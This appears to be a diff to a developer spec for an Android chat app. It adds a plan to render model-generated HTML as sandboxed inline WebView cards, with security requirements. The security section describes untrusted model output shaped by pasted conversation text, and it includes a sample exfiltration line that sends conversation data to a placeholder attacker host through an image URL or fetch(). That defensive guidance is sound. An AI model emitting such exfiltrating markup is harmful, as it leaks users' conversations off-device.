@@ -16,9 +16,10 @@ build straight through this list.
 1. **Model picker** — backend is done and deployed; do the client half.
    Fixes a control that does nothing *and* a fake cost figure.
 2. **Cramped-text sweep** — one instance fixed, find the rest.
-3. **Message rendering overhaul** (§R1–R3) — kill the assistant bubble,
-   then full markdown + LaTeX + tables + code highlighting via Markwon.
-   Owner-requested; this is what makes the app look serious.
+3. **Message rendering overhaul** (§R1, §R2, §R4) — kill the assistant
+   bubble; full markdown + LaTeX + tables + code highlighting via
+   Markwon; then inline sandboxed artifacts. Owner-requested; this is
+   what makes the app look serious. (§R3 is superseded by §R4.)
 4. **Memory browser** (§A) — real live endpoint, biggest capability win.
 5. **Floating voice capsule** (§B) — pure client-side, biggest feel win.
 6. **Haptics** (§D) — near-zero effort.
@@ -320,7 +321,116 @@ Specifics that matter:
   plain text while streaming and full markdown on the final event, and
   say that's what you did.
 
-### R3. Charts — needs a contract that does not exist yet
+### R4. Inline artifacts — render generated HTML *in the chat*
+
+**This supersedes R3.** If arbitrary HTML renders inline, charts come
+free (the model emits an HTML/SVG chart), so build this instead of the
+Vico chart path unless native charts are specifically wanted later.
+
+**What already exists, for reference.** The web client
+(`festofire-chat-ui`) renders artifacts with
+[Sandpack](https://sandpack.codesandbox.io/)
+(`@codesandbox/sandpack-react`) — an in-browser bundler running the
+generated code in an iframe, opened in a **side panel**
+(`client/src/components/Artifacts/ArtifactPreview.tsx`). Sandpack is a
+browser bundler and has no Android equivalent; do not try to port it.
+The *concept* ports, the implementation doesn't.
+
+**Owner's requirement: inline, in the message list — not a side panel,
+not a separate screen.**
+
+**The approach.** The model emits a fenced block; the client renders it
+as a live card inside the conversation:
+
+````
+```html
+<div style="font-family: system-ui">…</div>
+```
+````
+
+Render that block as a **sandboxed WebView card** inline in the
+`LazyColumn`, sized to its content, with a header strip (label +
+expand + copy-source) matching the code-block treatment from §R2.
+
+**Do not use Accompanist's WebView wrapper — it was deprecated in
+August 2023 with no replacement.** Use `AndroidView` around a platform
+`WebView` directly, or the maintained community fork
+[KevinnZou/compose-webview](https://github.com/KevinnZou/compose-webview).
+
+#### The four things that will actually bite
+
+1. **Height.** A `WebView` does not self-size, and inside a
+   `LazyColumn` an unconstrained one renders wrong or not at all — this
+   is a well-known, documented failure. Measure real content height by
+   injecting a tiny JS callback that reports
+   `document.body.scrollHeight`, then animate the container to it. Cap
+   at roughly 60% of screen height with a tap-to-expand full-screen
+   view for anything taller.
+2. **Nested scrolling.** Disable the WebView's own scrolling entirely
+   and let it size to content, so the `LazyColumn` owns vertical
+   scroll. Two competing scroll containers is the classic way this
+   feels broken.
+3. **Recycling.** `LazyColumn` recycles composables and WebViews are
+   expensive to construct. Key each artifact stably and retain the
+   instance so scrolling past and back does not reload (and re-run)
+   the content.
+4. **Streaming.** Never mount a WebView on partial content — a
+   half-streamed `<div>` renders as garbage and reloads on every edit.
+   Render the fence as plain code while `isStreaming`, and only mount
+   the WebView once the final event has landed.
+
+#### Security — non-negotiable, read this before writing the WebView
+
+This renders **model-generated code inside an app that holds live
+bearer tokens**. Model output is untrusted: it's influenced by
+conversation content, which can include text the user pasted from
+anywhere. Treat it as hostile input, not as your own code.
+
+Required `WebSettings` and loading behaviour:
+- `allowFileAccess = false`, `allowContentAccess = false`,
+  `allowFileAccessFromFileURLs = false`,
+  `allowUniversalAccessFromFileURLs = false` — otherwise generated JS
+  can read app-local files.
+- Load with `loadDataWithBaseURL(null, html, "text/html", "utf-8", null)`.
+  The **null base URL** gives an opaque origin, so the content has no
+  same-origin access to anything of yours.
+- **Block all network.** Implement `WebViewClient.shouldInterceptRequest`
+  and return an empty response for *every* request. Without this, a
+  single `fetch()` or `<img src="https://attacker/?d=...">` in a
+  generated reply can exfiltrate conversation content off-device. This
+  is the single most important line in this section.
+- The **only** `@JavascriptInterface` exposed is the height reporter,
+  and it must accept a number and nothing else. Never expose app state,
+  tokens, storage, or navigation.
+- Never interpolate a token, key, or user identifier into artifact HTML.
+
+With network blocked, an opaque origin, and no file access, the worst a
+hostile artifact can do is draw something strange in a box — an
+acceptable blast radius. Miss any one of those and it isn't.
+
+#### The backend half, and why it's deliberately not done yet
+
+Nothing currently tells the model to emit artifact blocks, so at first
+this renders any ` ```html ` the model happens to produce — enough to
+build and test against (ask it for "an HTML bar chart of X").
+
+Making it reliable needs a system-prompt change on the backend, and
+that change **must be surface-aware**: the same core answers Telegram,
+which cannot render HTML, so a blanket "prefer HTML artifacts"
+instruction would start dumping raw markup into Telegram. The outbound
+event already carries `surface` (`"mobile"` vs `"telegram"`), so the
+instruction has to be conditioned on it.
+
+That's backend work in `Wendy-Prototype`, not this repo. **Build the
+renderer, verify it against a hand-prompted HTML reply, and report that
+the prompt half is outstanding** — don't claim artifacts are wired
+end-to-end until the backend actually steers toward them.
+
+### R3. Charts — superseded by R4, build only if native charts are wanted
+
+*(Kept for reference. If §R4 inline artifacts ship, the model can emit
+an HTML or SVG chart and this becomes unnecessary. Build it only if
+someone specifically wants native-rendered charts.)*
 
 The owner asked for charts. **Be honest about this one:** nothing in the
 backend emits chart data today, and no markdown convention for charts
